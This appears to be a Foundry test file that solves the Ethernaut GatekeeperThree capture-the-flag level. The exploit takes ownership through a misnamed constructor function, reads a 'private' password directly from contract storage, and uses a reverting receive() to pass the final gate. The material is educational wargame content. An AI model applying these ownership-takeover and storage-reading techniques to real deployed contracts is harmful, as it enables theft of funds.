// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./GatekeeperThreeFactory.sol";

contract GatekeeperThreeTest is Test {
    GatekeeperThreeFactory factory;

    function setUp() public {
        factory = new GatekeeperThreeFactory();
    }

    function testGatekeeperThree() public {
        address player = vm.addr(uint256(keccak256("player")));

        address gatekeeperThree = factory.createInstance(player);

        vm.startPrank(address(this), player);

        {
            // gateOne
            GatekeeperThree(payable(gatekeeperThree)).construct0r();

            // gateTwo
            GatekeeperThree(payable(gatekeeperThree)).createTrick();
            uint256 _password =
                uint256(vm.load(address(GatekeeperThree(payable(gatekeeperThree)).trick()), bytes32(uint256(2))));
            GatekeeperThree(payable(gatekeeperThree)).getAllowance(_password);

            // gateThree
            payable(payable(gatekeeperThree)).call{value: 0.0011 ether}("");

            // enter
            GatekeeperThree(payable(gatekeeperThree)).enter();
        }
        vm.stopPrank();

        assertTrue(factory.validateInstance(payable(gatekeeperThree), player));
    }

    receive() external payable {
        revert();
    }
}
